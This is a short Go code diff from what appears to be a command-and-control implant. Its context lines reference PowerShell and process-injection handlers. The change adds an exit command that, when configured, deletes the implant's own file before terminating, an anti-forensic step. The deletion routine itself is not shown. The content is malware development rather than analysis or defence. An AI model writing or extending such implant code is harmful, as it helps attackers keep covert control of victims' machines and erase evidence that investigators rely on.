@@ -224,3 +224,15 @@ func CmdPowershellPort(cmdBuf []byte, powershellImport []byte) ([]byte, error) {
 func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
 	return packet.InjectProcess(cmdBuf)
 }
+
+func CmdExit() ([]byte, error) {
+	if config.DeleteSelf {
+		_, err := packet.DeleteSelf()
+		if err != nil {
+			return nil, err
+		}
+		os.Exit(0)
+	}
+	os.Exit(0)
+	return []byte("success exit"), nil
+}
